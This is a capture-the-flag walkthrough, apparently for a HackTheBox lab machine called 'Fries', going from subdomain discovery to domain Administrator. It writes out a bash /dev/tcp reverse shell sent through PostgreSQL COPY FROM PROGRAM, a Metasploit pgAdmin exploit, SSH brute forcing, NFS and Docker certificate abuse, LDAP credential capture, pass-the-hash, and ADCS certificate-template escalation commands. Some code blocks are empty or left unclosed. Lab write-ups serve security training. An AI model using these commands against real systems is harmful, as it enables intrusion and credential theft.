```

We see several interesting things on various ports, including an `SSH` and an `80` port, meaning there is an internal `Linux` system in addition to the `Windows` host. We are also interested in the `SMB` server and `Kerberos` from the `Windows` side.

We also see a `domain` that we need to add to our important `hosts` file.

```shell
nano /etc/hosts

#Inside nano
<IP>            fries.htb dc01.fries.htb
```
Save it...

We are given credentials directly from `HTB`:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-11-25 092605.png" alt=""><figcaption></figcaption></figure>

```
User: d.cooper@fries.htb
Pass: D4LE11maan!!
```

Let's test these credentials to see where they are valid. If we try `SSH`, they won't be correct, and they won't work for `SMB` either.

## FFUF Subdomains

We will perform `fuzzing` with the `FFUF` tool as follows:

```shell
ffuf -c -w <WORDLIST> -u http://fries.htb -H "Host: FUZZ.fries.htb" -fw 4
```

Info:

```

We find a `subdomain` named `code`. Let's add it to our `hosts` file.

```shell
nano /etc/hosts

#Inside nano
<IP>            fries.htb dc01.fries.htb code.fries.htb
```

If we visit it, we see the following:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-11-25 111215.png" alt=""><figcaption></figcaption></figure>

We see an interesting piece of `software` called `Gitea`. If we try the credentials provided by `HTB`, we see that they work, and we are logged in:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-11-25 111236.png" alt=""><figcaption></figcaption></figure>

Let's look around the repos for useful information.

If we go to the user's `commits`, we find `PostgreSQL` credentials in the `.env` file:

```
DATABASE_URL=postgresql://root:PsqLR00tpaSS11@172.18.0.3:5432/ps_db
SECRET_KEY=y0st528wn1idjk3b9a
```

These are quite interesting. If we continue investigating, we also find this:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-11-25 112611.png" alt=""><figcaption></figcaption></figure>

Reading the `README.md`, we see a `subdomain` hosting the `PostgreSQL DB`. Let's add it to our `hosts` file.

```shell
nano /etc/hosts

#Inside nano
<IP>            fries.htb dc01.fries.htb code.fries.htb db-mgmt05.fries.htb
```

If we visit that `subdomain`, we see the following:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-11-25 112815 (1).png" alt=""><figcaption></figcaption></figure>

We see a `PgAdmin` `login`. If we try the found credentials, we get no luck, but if we reuse the password from the `HTB` user:

```
User: d.cooper@fries.htb
Pass: D4LE11maan!!
```

It works, and we are logged in:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-11-25 112958.png" alt=""><figcaption></figcaption></figure>

If we open the `DB`, it asks for the `root` password. We use the one we obtained from `gitea`, which is `PsqLR00tpaSS11`, and all the `DB` information is displayed.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-11-25 113112.png" alt=""><figcaption></figcaption></figure>

Let's open a `Query` terminal and try to execute system commands from `PgAdmin`. First, let's see if `id` or directory listing works.

```postgresql
SELECT pg_ls_dir('/'); -- This works, returns directories
SELECT pg_read_file('/etc/passwd'); -- We can read files

-- Execute system commands
CREATE TABLE IF NOT EXISTS cmd_test(result text);
COPY cmd_test FROM PROGRAM 'id';
SELECT * FROM cmd_test;
```

Info:

```
uid=999(postgres) gid=999(postgres) groups=999(postgres),101(ssl-cert)
```

It's working, so let's send ourselves a `reverse shell`. First, we set up a listener:

```shell
nc -lvnp <PORT>
```

Now we send this:

```sql
CREATE TABLE IF NOT EXISTS cmd_test(result text);
COPY cmd_test FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/<IP_ATTACKER>/<PORT> 0>&1"';
SELECT * FROM cmd_test;
```

When we check our listener, we see the following:

```
listening on [any] 7777 ...
connect to [10.10.14.49] from (UNKNOWN) [10.10.11.96] 49872
bash: cannot set terminal process group (430): Inappropriate ioctl for device
bash: no job control in this shell
postgres@858fdf51af59:~/data$ whoami
whoami
postgres
```

It worked! We get a shell, so let's sanitize it.

### Shell Sanitization (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# To see our console dimensions on the Host
stty size

# To resize the console using the appropriate parameters
stty rows <ROWS> columns <COLUMNS>
```

But we don't find anything too interesting. Let's look for vulnerabilities associated with `PgAdmin`. A quick search reveals `CVE-2025-2945`. Let's exploit it with `msfconsole`.

## CVE-2025-2945 (RCE)

```shell
msfconsole -q
```

Inside, we select the `exploit` module:

```shell
use exploit/multi/http/pgadmin_query_tool_authenticated
```

Checking the options, we configure it as follows:

```shell
set LHOST <IP_ATTACKER>
set LPORT <PORT>
set RHOSTS <IP_VICTIM>
set USERNAME d.cooper@fries.htb
set PASSWORD D4LE11maan!!
set DB_USER root
set DB_PASS PsqLR00tpaSS11
set DB_NAME ps_db
set RHOSTS db-mgmt05.fries.htb
set VHOST db-mgmt05.fries.htb
```

Now, if we run `exploit`, we see this:

```
[*] Started reverse TCP handler on 10.10.14.49:7755 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. pgAdmin version 9.1.0 is affected
[+] Successfully authenticated to pgAdmin
[+] Successfully initialized sqleditor
[*] Exploiting the target...
[*] Sending stage (24768 bytes) to 10.10.11.96
[+] Received a 500 response from the exploit attempt, this is expected
[*] Meterpreter session 1 opened (10.10.14.49:7755 -> 10.10.11.96:49808) at 2025-11-25 10:49:55 -0800

meterpreter > getuid
Server username: pgadmin
```

It worked, and we gained access as another user in another container. Let's see what we can do here.

## Escalate user svc

If we list environment variables, we find the following:

```shell
env
```

Info:

```
HOSTNAME=cb46692a4590
SHLVL=1
PGADMIN_DEFAULT_PASSWORD=Friesf00Ds2025!!
CONFIG_DISTRO_FILE_PATH=/pgadmin4/config_distro.py
HOME=/home/pgadmin
PGADMIN_DEFAULT_EMAIL=admin@fries.htb
SERVER_SOFTWARE=gunicorn/22.0.0
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
OAUTHLIB_INSECURE_TRANSPORT=1
CORRUPTED_DB_BACKUP_FILE=
PWD=/pgadmin4
PGAPPNAME=pgAdmin 4 - CONN:3139039
PYTHONPATH=/pgadmin4
```

We see a password for the user `admin@fries.htb`. If we try it in `PgAdmin`, it works, and after entering the `root` password, it lists the `DBs`, though nothing interesting is found. We save this password for future use.

Let's try to gather users by creating a user list and brute-forcing `SSH`. If we go to the page where we found the subdomain called `pwm` using fuzzing, we need to access it via `HTTPS`.

```
URL = https://pwm.fries.htb/
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-11-25 141019.png" alt=""><figcaption></figcaption></figure>

We see a `login` page. If we try any credentials, like `admin:admin`, we see:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-11-25 141058.png" alt=""><figcaption></figcaption></figure>

We get an error that shows important information, including a user. With this info, let's create `users.txt`.

> users.txt

```
admin
d.cooper
cooper
dale

postgres
pgadmin

```

Now let's run `hydra`.

```shell
hydra -L users.txt -p 'Friesf00Ds2025!!' ssh://<IP> -t 64 -I
```

Info:

### SSH (svc)

It worked! Let's access via `SSH` with the credentials.

```shell
ssh svc@<IP>
```

We enter `Friesf00Ds2025!!` as the password...

## Escalate user svc\_infra

### NFS Vulnerability

Extensive investigation shows a vulnerability at the `NFS` level. This can be discovered by listing the following:

```shell
showmount -e localhost
```

Info:

```
Export list for localhost:
/srv/web.fries.htb *
```

We can mount anything inside this folder, and coincidentally, there is a folder with all permissions:

```shell
ls -la /srv/web.fries.htb
```

Info:

```
total 20
drw-r-xr-x 5  655 root           4096 May 28 17:17 .
drwxr-xr-x 3 root root           4096 May 27  2025 ..

drwxr----- 5 svc  svc            4096 Jun  7 13:30 webroot
```

Before doing anything, having identified this, let's go to our `kali` machine and work from there using a tool that creates a `tunnel` or a `proxy/VPN` to the victim server to work externally as if we were on the internal local network.

```shell
apt install sshuttle
```

Once installed, we run it like this:

```shell
sshuttle -r svc@<IP> -N
```

Info:

```
svc@10.10.11.96's password: 
c : Connected to server.
```

The connection is `tunneled`. Now, from another terminal on our `kali`, we download a tool found online that helps with this exploitation:

URL = [GitHub nfs-security-tooling](https://github.com/hvs-consulting/nfs-security-tooling)

We run these commands to install the tool:

```shell
sudo apt update
sudo apt install pkg-config libfuse3-dev python3-dev
pipx install git+https://github.com/hvs-consulting/nfs-security-tooling.git
```

Info:

```
installed package nfs_security_tooling 0.1, installed using Python 3.13.7
  These apps are now globally available
    - fuse_nfs
    - nfs_analyze
⚠️  Note: '/root/.local/bin' is not on your PATH environment variable. These apps will not be globally accessible until your PATH is updated. Run `pipx
    ensurepath` to automatically add it, or manually modify your PATH in your shell's config file (e.g. ~/.bashrc).
done! ✨ 🌟 ✨
```

Once installed correctly, we run it as follows:

```shell
/root/.local/bin/nfs_analyze 192.168.100.2 --check-no-root-squash
```

This `check` shows it's vulnerable and reveals the `shadow` file content. We proceed with the `exploitation`.

```shell
mkdir /tmp/nfs_mount
/root/.local/bin/fuse_nfs --export /srv/web.fries.htb --fake-uid --allow-write /tmp/nfs_mount 192.168.100.2
```

Now let's check if it mounted correctly.

```shell
ls -la /tmp/nfs_mount
```

Info:

```

drwxrwxrwx 2 root 59605603 4096 May 26  2025 certs
drwxrwxrwx 2 root root     4096 Nov 26 08:14 shared
drwxr--rwx 5 kali kali     4096 Jun  7 06:30 webroot
```

It worked. Since we have the `CA`, we can create a self-signed certificate as the `root` user to access via `SSH`.

We enter `certs` and open a tunnel for port `2376`, as the `certificate` is using the local `IP` and requires this to avoid errors.

```shell
ssh svc@<IP> -L 2376:127.0.0.1:2376
```

Enter the user's password to log into `SSH`. Now that the port is `tunneled`, we run a `docker` command internally from the machine but from our `kali`.

```shell
docker --tlsverify \
  --tlscacert=ca.pem \
  --tlscert=cert.pem \
  --tlskey=key.pem \
  -H=tcp://127.0.0.1:2376 ps
```

Info:

```
Error response from daemon: authorization denied by plugin authz-broker: no policy applied (user: 'fries' action: 'container_list')
```

We get an error, but it's a good error. We just need to generate our self-signed certificate as `root`, as the error mentions the `fries` user's certificate is being used.

```shell
openssl genrsa -out root-key.pem 4096
openssl req -new -key root-key.pem -out root.csr -subj "/CN=root"
openssl x509 -req -in root.csr -CA ca.pem -CAkey ca-key.pem -CAcreateserial -out root-cert.pem -days 365
```

Info:

```
Certificate request self-signature ok
subject=CN=root
```

Now, we list the `dockers` processes again...

```shell
docker --tlsverify \                                                               
  --tlscacert=ca.pem \
  --tlscert=root-cert.pem \
  --tlskey=root-key.pem \
  -H=tcp://127.0.0.1:2376 ps
```

```

It's working this time. We enter the `container` that attracts our attention the most, which is with `ID` `f42`, because it's using `LDAP`, and we can modify anything we want.

```shell

Inside the container, after some investigation, we find this file:

```shell
cat /config/PwmConfiguration.xml | grep "ldap*"
```

Info:

```

            <value>ldaps://dc01.fries.htb:636</value>
............................<REST OF THE CODE>.....................................
```

We see a crucial section where it's attempting to connect but is erroring out. We modify the file to point to our `IP` to capture the service user's credentials while listening with `responder`.

```shell
sed -i 's|ldaps://dc01.fries.htb:636|ldap://<IP_ATTACKER>:389|' PwmConfiguration.xml
```

Once done, we connect to the hosted page:

```
URL = https://pwm.fries.htb
```

Now we set up a listener:

```shell
responder -I tun0 -wdv
```

If we enter any credentials on the `login` page and check our listener:

```

It worked, and we see the credentials. We test them with `netexec`.

```shell
netexec ldap <IP> -u svc_infra -p 'm6tneOMAh5p0wQ0d'
```

Info:

```

They are valid. Now we download a `ZIP` file for analysis in `BloodHound`.

```shell

### BloodHound

We quickly install `BloodHound` in a `docker`:

URL = [Download BloodHound in Docker](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart)

```shell
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
tar -xvzf bloodhound-cli-linux-amd64.tar.gz

```

With the docker imported and running, we access the following `URL`.

```
URL = http://127.0.0.1:8080/ui/login
```

We log in with the provided credentials. After changing the password, we are directed inside:

```
User: admin
Pass: bnf8XsztC4Hypx6nMV5eSlhHpuDfEWgH
```

Inside, we import the `.zip` and wait for the data to load. Checking the dashboard, we investigate the `svc_infra` user.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-11-26 133510.png" alt=""><figcaption></figcaption></figure>

The user has `ReadMSAPassword` privileges over the `GMSA_CA_PROD$` user.

### ReadMSAPassword over GMSA\_CA\_PROD$

```shell
bloodyAD --host <IP> -d fries.htb -u svc_infra -p 'm6tneOMAh5p0wQ0d' get object 'GMSA_CA_PROD$' --attr msDS-ManagedPassword
```

Info:

```

### evil-winrm (GMSA\_CA\_PROD$)

Now we perform a `Pass-The-Hash` via `WinRM`:

```shell
evil-winrm -i <IP> -u 'gMSA_CA_prod$' -H fc20b3d3ec179c5339ca59fbefc18f4a
```

Info:

```

```

It worked! We are logged in using an account with certificate creation/generation power. We attempt to get a self-signed certificate as the `Administrator` user, similar to how we did with `root`.

## Escalate Privileges

### Certipy-ad (Vulnerable Templates)

From our `kali` machine, we use the `certipy-ad` utility to find `vulnerable` templates using the account's credentials.

```shell
certipy-ad find -u 'gMSA_CA_prod$' -hashes 'fc20b3d3ec179c5339ca59fbefc18f4a' -dc-ip <IP> -vulnerable
```

```

We have generated several files that we investigate.

### Configuration for `ESC7` to `ESC6`

We find that `ESC7` is the one we are interested in:

```
[!] Vulnerabilities
      ESC7                              : User has dangerous permissions.
```

Now we can pivot from `ESC7` to `ESC6`.

URL = [ESC7 to ESC6 Configuration](https://www.thehacker.recipes/ad/movement/adcs/access-controls#esc7-exposing-to-esc6)

```powershell
Import-Module PSPKI
$configReader = New-Object SysadminsLV.PKI.Dcom.Implementations.CertSrvRegManagerD "DC01.fries.htb"
$configReader.SetRootNode($true)
$configReader.SetConfigEntry(1376590, "EditFlags", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
```

We import the necessary module and enable the `template`. Then we verify it:

```powershell
$configReader.GetConfigEntry("EditFlags", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
```

Info:

```
1376590
```

It is correctly enabled with the number `1376590`.

### Enable `ESC16` to Disable Security

Now we add the OID extension `1.3.6.1.4.1.311.25.2` to the list of disabled extensions to enable `ESC16`.

> Extra Information

The `ESC16` vulnerability occurs when a Certificate Authority (CA) is configured to disable the inclusion of OID `1.3.6.1.4.1.311.25.2` (the security extension) in all certificates it issues, or if the `KB5014754` patch has not been applied. This makes the `CA` behave as if all its published templates were vulnerable to the `ESC9` vector.

```powershell
$configReader = New-Object SysadminsLV.PKI.Dcom.Implementations.CertSrvRegManagerD "DC01.fries.htb"
$configReader.SetRootNode($true)
$ConfigReader.SetConfigEntry("1.3.6.1.4.1.311.25.2", "DisableExtensionList", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
```

We verify this as follows:

```shell
certipy-ad find -u 'gMSA_CA_prod$' -hashes 'fc20b3d3ec179c5339ca59fbefc18f4a' -dc-ip <IP> -vulnerable -stdout

### ESC6 Exploitation

Now we `exploit` the `ESC6` vulnerability:

URL = [Privilege Escalation ESC6](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc6-ca-allows-san-specification-via-request-attributes)

```shell

The certificate is correctly generated and authenticated as the `Administrator`. We use it to authenticate and obtain the `Administrator's` `Hash`.

It worked, and we correctly obtained the `hash`. We perform a `Pass-The-Hash` with `evil-winrm`.

### evil-winrm (Administrator)
